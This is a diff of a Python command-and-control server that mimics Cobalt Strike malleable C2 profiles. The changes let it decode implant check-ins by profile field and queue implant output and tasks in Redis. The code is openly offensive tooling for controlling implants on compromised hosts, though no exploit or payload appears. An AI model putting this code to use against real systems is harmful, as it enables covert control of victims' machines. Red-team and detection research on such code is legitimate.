@@ -170,6 +170,7 @@ async def deobsfucate_malleable_c2_request_data(
     # coudl just require the parser class instead of adding both
     malleable_c2_block,
     parser_class,
+    block_field,  # field to apply to,  ex, id, output, etc. mp.http_post.client.id otherwise parser doesn't know
     terminator_key=None,
 ) -> bytes:
     """
@@ -213,8 +214,10 @@ async def deobsfucate_malleable_c2_request_data(
             check_if_data(data_from_request)
 
             try:
-                hce = parser_class(client_block=malleable_c2_block)
-                data = hce.apply_transforms(data=data_from_request)
+                hce = parser_class(malleable_c2_block)
+                data = hce.apply_transforms(
+                    data=data_from_request, block_field=block_field
+                )
                 print(f"De-Obsfucated data: {data}")
                 return data
             except Exception as e:
@@ -229,8 +232,10 @@ async def deobsfucate_malleable_c2_request_data(
             check_if_data(data_from_request)
 
             try:
-                hce = parser_class(client_block=malleable_c2_block)
-                data = hce.apply_transforms(data=data_from_request)
+                hce = parser_class(malleable_c2_block)
+                data = hce.apply_transforms(
+                    data=data_from_request, block_field=block_field
+                )
                 print(f"De-Obsfucated data: {data}")
                 return data
             except Exception as e:
@@ -366,6 +371,7 @@ async def http_get(request: Request) -> Response:
             terminator_type=metadata_terminator_type,
             terminator_key=metadata_terminator_key,
             malleable_c2_block=mp.http_get.client,
+            block_field=mp.http_get.client.metadata,  # use metadata field to extract
             parser_class=HttpGetBlockClientParser,
         )
         print(f"Data from implant: {data_from_implant}")
@@ -393,10 +399,10 @@ async def http_get(request: Request) -> Response:
     # note, payload would need to be inserted somehwere here too.  Ex,
     # redis lookup for next task -> insert where print it
     # | Redis Here >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    implant_id = unpacked_metadata.get("implant_uuid", None)
-    check_if_data(implant_id)
+    implant_uuid = unpacked_metadata.get("implant_uuid", None)
+    check_if_data(implant_uuid)
 
-    its = RedisImplantTaskService(implant_id)
+    its = RedisImplantTaskService(implant_uuid)
     msgpack_task = its.dequeue_task()
     if not msgpack_task:
 
@@ -499,10 +505,10 @@ async def http_get_uri(request: Request) -> Response:
     # note, payload would need to be inserted somehwere here too.  Ex,
     # redis lookup for next task -> insert where print it
     # | Redis Here >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-    implant_id = unpacked_metadata.get("implant_uuid", None)
-    check_if_data(implant_id)
+    implant_uuid = unpacked_metadata.get("implant_uuid", None)
+    check_if_data(implant_uuid)
 
-    its = RedisImplantTaskService(implant_id)
+    its = RedisImplantTaskService(implant_uuid)
     msgpack_task = its.dequeue_task()
     if not msgpack_task:
         raise HTTPException(
@@ -591,6 +597,7 @@ async def http_post(request: Request) -> Response:
             terminator_type=output_terminator_type,
             terminator_key=output_terminator_key,
             malleable_c2_block=mp.http_post.client,
+            block_field=mp.http_post.client.output,
             parser_class=HttpPostBlockClientParser,
         )
         print(f"Data from implant: {data_from_implant}")
@@ -603,21 +610,22 @@ async def http_post(request: Request) -> Response:
         # https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_beacon-http-transaction-walkthru.htm#_Toc65482844
         id_terminator_type, id_terminator_key = hce.get_id_terminator()
 
-        # print("id term, id key")
-        # print(id_terminator_type)
-        # print(id_terminator_key)
+        print("id term, id key")
+        print(id_terminator_type)
+        print(id_terminator_key)
         # check if keys
         check_if_data(id_terminator_type)
         check_if_data(id_terminator_key)
 
-        implant_id = await deobsfucate_malleable_c2_request_data(
+        implant_uuid = await deobsfucate_malleable_c2_request_data(
             request=request,
             terminator_type=id_terminator_type,
             terminator_key=id_terminator_key,
             malleable_c2_block=mp.http_post.client,
+            block_field=mp.http_post.client.id,
             parser_class=HttpPostBlockClientParser,
         )
-        print(f"Implant ID: {implant_id}")
+        print(f"Implant ID: {implant_uuid}")
     except Exception as e:
         print(e)
         raise HTTPException(status_code=400, detail="Invalid or malformed client data")
@@ -633,15 +641,13 @@ async def http_post(request: Request) -> Response:
     headers = emitter.headers()
     # data = emitter.generate_data()
 
-    # note, payload would need to be inserted somehwere here too.  Ex,
-    # redis lookup for next task -> insert where print it
+    # data coming in fucekd up, might be my fault:
+    # "c2:implant:b'\\xd3_[kw\\xf4\\xfbO\\x1eo\\xee\\xdc{o\\xbc\\xf7n>\\xdb\\xde\\x9co\\xa79\\xef\\xd7\\x1c':tasks:inbox"
 
-    # data_from_implant, and implant_id are in scope now
-
-    # spin up  redis class
-    # write to inbox queue (which doesn't exist yet...)
-
-    # return response
+    # spin up redis class, write deobsfucated data to redis.
+    # this will get picked up by the redis batch watchdog and write to mysql
+    rits = RedisImplantTaskService(implant_uuid)
+    rits.enqueue_response(data_from_implant)
 
     """
     Statement 	        What
